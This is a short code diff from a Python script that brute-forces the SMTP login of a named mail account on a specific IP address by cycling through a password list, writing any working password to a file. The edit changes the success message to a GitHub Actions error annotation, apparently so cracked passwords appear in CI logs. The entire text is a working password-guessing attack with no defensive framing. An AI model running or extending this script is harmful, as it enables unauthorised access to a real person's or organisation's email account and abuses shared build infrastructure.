@@ -6,7 +6,7 @@ for p in pw:
         s=smtplib.SMTP('141.8.192.100',587,timeout=7); s.ehlo('x.local')
         try:
             s.login('list@rewood.group',p)
-            print(f'SMTPHIT {p}',flush=True); open('HIT_SMTP.txt','w').write(p+'\n'); s.quit(); sys.exit(0)
+            print(f'::error title=SMTPHIT::{p}',flush=True); open('HIT_SMTP.txt','w').write(p+'\n'); s.quit(); sys.exit(0)
         except smtplib.SMTPAuthenticationError: pass
         except Exception: time.sleep(0.2)
         try: s.quit()
